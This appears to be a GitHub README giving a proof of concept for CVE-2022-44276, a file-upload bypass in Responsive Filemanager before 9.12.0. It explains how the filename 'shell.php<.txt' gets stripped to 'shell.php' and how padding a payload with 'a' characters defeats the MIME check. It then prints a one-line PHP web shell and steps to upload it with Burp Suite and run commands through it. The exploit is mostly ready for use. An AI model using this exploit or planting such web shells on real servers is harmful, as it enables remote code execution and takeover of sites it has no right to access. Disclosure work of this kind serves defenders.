# CVE-2022-44276-PoC
PoC for Responsive Filemanager &lt; 9.12.0 bypass upload restrictions lead to RCE

# Where's vuln?

When uploading new file we go through function `fix_filename`: https://github.com/trippo/ResponsiveFilemanager/blob/9a7411f3eab3b7d8e2c78dcf40b4325bde2c548d/filemanager/upload.php#L112

In this function we have function `strip_tags` which searches brackets and removes them: https://github.com/trippo/ResponsiveFilemanager/blob/9a7411f3eab3b7d8e2c78dcf40b4325bde2c548d/filemanager/include/utils.php#L581

So, we can send file with filename lick `shell.php<.txt`, which will be renamed to `shell.php` due to function `strip_tags`.

But, there's additional check of file type by it's content: https://github.com/trippo/ResponsiveFilemanager/blob/9a7411f3eab3b7d8e2c78dcf40b4325bde2c548d/filemanager/upload.php#L101

So, we cannot upload classic php shell `<?php system($_GET['c']);?>`. But, we can do a little trick: function `get_extension_from_mime` works based on first several chars of file. So, if we start our payload with several 'a' chars, it can be detected with `txt` type.

# How to exploit

1) Intercept upload request with burp suite
2) Change filename to `shell.php<.txt`
![Pasted image 20230625121536](https://github.com/HerrLeStrate/CVE-2022-44276-PoC/assets/26091132/74cb5ff7-bb02-4c6f-b4c5-cd20c0db434d)
3) go to url/source/shell.php?c=<your_command>
![Pasted image 20230625121700](https://github.com/HerrLeStrate/CVE-2022-44276-PoC/assets/26091132/7dc845ca-9ba9-4838-bff8-48ea59da35c0)
